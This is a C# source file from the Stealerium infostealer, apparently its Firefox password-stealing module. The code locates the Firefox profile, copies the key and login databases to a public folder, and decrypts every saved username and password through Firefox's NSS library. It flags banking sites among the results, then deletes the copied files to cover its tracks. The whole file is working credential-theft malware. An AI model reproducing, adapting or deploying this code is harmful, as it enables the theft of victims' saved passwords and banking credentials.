using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Firefox
{
    internal sealed class CPasswords
    {
        private static readonly string SystemDrive =
            Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));

        private static readonly string MozillaPath = Path.Combine(SystemDrive, "Program Files\\Mozilla Firefox");
        private static readonly string CopyTempPath = Path.Combine(SystemDrive, "Users\\Public");
        private static readonly string[] RequiredFiles = {"key3.db", "key4.db", "logins.json", "cert9.db"};

        // Get profile directory location
        private static string GetProfile(string path)
        {
            try
            {
                var dir = path + "\\Profiles";
                if (Directory.Exists(dir))
                    foreach (var sDir in Directory.GetDirectories(dir))
                        if (File.Exists(sDir + "\\logins.json"))
                            return sDir;
            }
            catch (Exception ex)
            {
                Logging.Log("Firefox >> Failed to find profile\n" + ex);
            }

            return null;
        }

        // Copy key3.db, key4.db, logins.json if exists
        private static string CopyRequiredFiles(string profile)
        {
            var profileName = new DirectoryInfo(profile).Name;
            var newProfileName = Path.Combine(CopyTempPath, profileName);

            if (!Directory.Exists(newProfileName))
                Directory.CreateDirectory(newProfileName);

            foreach (var file in RequiredFiles)
                try
                {
                    var requiredFile = Path.Combine(profile, file);
                    if (File.Exists(requiredFile))
                        File.Copy(requiredFile, Path.Combine(newProfileName, Path.GetFileName(requiredFile)));
                }
                catch (Exception ex)
                {
                    Logging.Log("Firefox >> Failed to copy files to decrypt passwords\n" + ex);
                    return null;
                }

            return Path.Combine(CopyTempPath, profileName);
        }

        // Get bookmarks from gecko browser
        public static List<Password> Get(string path)
        {
            var pPasswords = new List<Password>();
            // Get firefox default profile directory
            var profile = GetProfile(path);
            if (profile == null) return pPasswords;
            // Copy required files to temp dir
            var newProfile = CopyRequiredFiles(profile);
            if (newProfile == null) return pPasswords;

            try
            {
                var json = File.ReadAllText(Path.Combine(newProfile, "logins.json"));
                json = Regex.Split(json, ",\"logins\":\\[")[1];
                json = Regex.Split(json, ",\"potentiallyVulnerablePasswords\"")[0];
                var accounts = Regex.Split(json, "},");

                if (Decryptor.LoadNss(MozillaPath))
                {
                    if (Decryptor.SetProfile(newProfile))
                        foreach (var account in accounts)
                        {
                            Match
                                host = FfRegex.Hostname.Match(account),
                                user = FfRegex.Username.Match(account),
                                pass = FfRegex.Password.Match(account);

                            if (!host.Success || !user.Success || !pass.Success) continue;
                            string
                                hostname = Regex.Split(host.Value, "\"")[3],
                                username = Decryptor.DecryptPassword(Regex.Split(user.Value, "\"")[3]),
                                password = Decryptor.DecryptPassword(Regex.Split(pass.Value, "\"")[3]);

                            var pPassword = new Password
                            {
                                Url = hostname,
                                Username = username,
                                Pass = password
                            };

                            // Analyze value
                            Banking.ScanData(hostname);
                            Counter.Passwords++;

                            pPasswords.Add(pPassword);
                        }

                    Decryptor.UnLoadNss();
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Firefox >> Failed collect passwords\n" + ex);
            }

            Filemanager.RecursiveDelete(newProfile);
            return pPasswords;
        }

        internal sealed class FfRegex
        {
            public static readonly Regex Hostname = new Regex("\"hostname\":\"([^\"]+)\"");
            public static readonly Regex Username = new Regex("\"encryptedUsername\":\"([^\"]+)\"");
            public static readonly Regex Password = new Regex("\"encryptedPassword\":\"([^\"]+)\"");
        }
    }
}